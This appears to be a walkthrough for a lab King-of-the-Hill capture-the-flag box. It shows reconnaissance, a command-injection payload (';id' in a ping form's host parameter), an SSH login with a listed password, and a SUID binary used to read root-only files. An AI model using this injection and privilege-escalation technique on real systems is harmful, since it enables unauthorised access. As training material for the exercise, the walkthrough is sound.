# AM-KoTH: QUORUM Core — Player Walkthrough

> **Difficulty:** SOVEREIGN (unlocks at COBALT clearance / 2800 CP)
> **Services:** HTTP (port 80), SSH (port 22)
> **Flag:** Rotating KoTH flag (changes every ~5 minutes)
> **Skills learned:** Command injection, SUID binary exploitation, King-of-the-Hill mechanics, flag submission to the scoring engine

This is a **King of the Hill (KotH)** challenge — different from the other Anomaly Machines. The flag **rotates** every few minutes, so you must repeatedly exploit the box to stay on top. The first player to capture the flag becomes the "holder" and earns CP per minute. Other players must re-exploit to steal the flag back.

---

## Prerequisites

- COBALT clearance (2800+ CP) — this challenge unlocks late in the event
- A Kali Linux VM with nmap, curl, and sshpass installed
- The target running (dev: `80:80`, `2227:22` + internal `8081`; production: `10.10.1.100`)
- Understanding of command injection and SUID binaries (from AM-01 through AM-06)

---

## Stage 1 — Reconnaissance

```bash
nmap -sV -sC localhost
```

**Expected output:**
```
80/tcp   open  http    Apache (QUORUM monitoring console)
2227/tcp open  ssh     OpenSSH
```

**What we learned:** A web console on port 80 and SSH on port 2227 (dev port). The web console is the entry point.

---

## Stage 2 — Web Console Discovery

**Goal:** Find the vulnerability in the QUORUM monitoring console.

Browse the web console:

```bash
curl http://localhost/
```

**Expected output:** A QUORUM monitoring dashboard showing system status (all green, surface "uninhabitable", etc.). There's a link to a "Network Connectivity Diagnostic" page.

Visit the diagnostic page:

```bash
curl http://localhost/diagnostic.php
```

This page has a form that lets you "ping" a host to check connectivity. It takes a `host` parameter and runs `ping -c 1 -W 1 <host>`.

---

## Stage 3 — Command Injection

**Goal:** Get a shell on the machine by injecting commands through the diagnostic form.

**The vulnerability:** The `host` parameter is passed directly to the shell command without sanitization. We can inject additional commands using a semicolon.

Test the injection:

```bash
curl "http://localhost/diagnostic.php?host=127.0.0.1;id"
```

**Expected output (look for uid= in the diagnostic output):**
```
uid=1000(quorum-svc) gid=1000(quorum-svc) groups=1000(quorum-svc)
```

**It works!** The web service runs as `quorum-svc` (a low-privilege user). We have command execution, but we need root to read the flag.

---

## Stage 4 — SSH Access (Optional, for a proper shell)

The webshell is one command at a time. For a better experience, use SSH. The `quorum-svc` account has a known password for SSH access:

```bash
sshpass -p 'qu0rum_c0re_2026' ssh -p 2227 quorum-svc@localhost
```

Now you have an interactive shell as `quorum-svc`.

---

## Stage 5 — SUID Binary Discovery

**Goal:** Find a SUID binary that can read the root-only flag file.

The KotH flag is at `/root/koth_flag.txt`, readable only by root. We can't read it directly as `quorum-svc`:

```bash
cat /root/koth_flag.txt
# cat: /root/koth_flag.txt: Permission denied
```

Find SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Expected output (interesting entry):**
```
/usr/local/bin/quorum-diag
```

Check its permissions:

```bash
ls -la /usr/local/bin/quorum-diag
# -rwsr-xr-x 1 root root ... /usr/local/bin/quorum-diag
```

**What is this binary?** It's a diagnostic tool that runs as root (SUID). Let's explore its options:

```bash
/usr/local/bin/quorum-diag
# Usage: quorum-diag --status <check>
#        quorum-diag --read-file <path>
```

**Key finding:** The `--read-file` option reads any file using the SUID root privilege! This is our privesc primitive.

---

## Stage 6 — Reading the KoTH Flag

**Goal:** Use the SUID binary to read the rotating flag.

```bash
/usr/local/bin/quorum-diag --read-file /root/koth_flag.txt
```

**Expected output:**
```
DZ{koth_PLACEHOLDER}
```

The actual flag value changes every ~5 minutes (the scoring engine rotates it). You must read it and submit it quickly before it changes.

---

## Stage 7 — Submitting the Flag

**Goal:** Submit the captured flag to the scoring engine to become the KotH holder.

Use the QUORUM terminal or the scoring engine API:

```bash
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "X-Token: YOUR_PLAYER_TOKEN" \
  -d '{"flag": "DZ{koth_abc123}"}' \
  http://SCORING_ENGINE:8080/api/koth/capture
```

**Expected response:**
```
{"result": "KotH flag captured. Hold it to earn 10 CP/min."}
```

**What happens when you capture the flag:**
1. The previous holder's "hold" ends, and they get CP for the time they held it
2. You get +50 CP for the steal
3. You start earning +10 CP per minute (per tick) while you hold
4. Another player must re-exploit and steal the flag from you to take over

---

## Stage 8 — Defending (Optional)

**Goal:** Make it harder for other players to steal the flag from you.

Once you hold the flag, you can try to "patch" the vulnerabilities:

```bash
# Remove the SUID bit from quorum-diag:
chmod -s /usr/local/bin/quorum-diag

# Or fix the command injection in diagnostic.php:
# (if you have write access to the web files)
```

However, other players might revert your patches, or the container might restart periodically. KotH is a continuous battle — stay alert!

---

## Summary

| Step | Technique | What we did |
|------|-----------|-------------|
| 1 | Nmap enumeration | Found HTTP (80), SSH (22) |
| 2 | Web console discovery | Found diagnostic.php with a ping form |
| 3 | Command injection | Injected `;id` via the `host` parameter, got RCE |
| 4 | SSH access | Logged in as `quorum-svc` with known password |
| 5 | SUID discovery | Found `/usr/local/bin/quorum-diag` (SUID root) |
| 6 | Flag read | Used `--read-file` to read `/root/koth_flag.txt` |
| 7 | Flag submission | Submitted to scoring engine, became KotH holder |
| 8 | Defense | Patched vulnerabilities to slow down opponents |

**Key takeaways:**
- **KotH is about speed and repetition.** The flag rotates, so you must exploit quickly and repeatedly. Automate the exploit if you can.
- **Command injection is simple but powerful.** A single `;` in an unsanitized input field gives you RCE.
- **SUID `--read-file` is a direct privesc.** The binary reads files as root — no shell needed, just read the flag directly.
- **Defense matters in KotH.** Once you hold the flag, patch the vulnerabilities to slow down attackers. But beware — patches can be reverted.
- **The flag is a race.** If someone else holds it, you need to read the *current* flag value (which changes every 5 minutes) before submitting.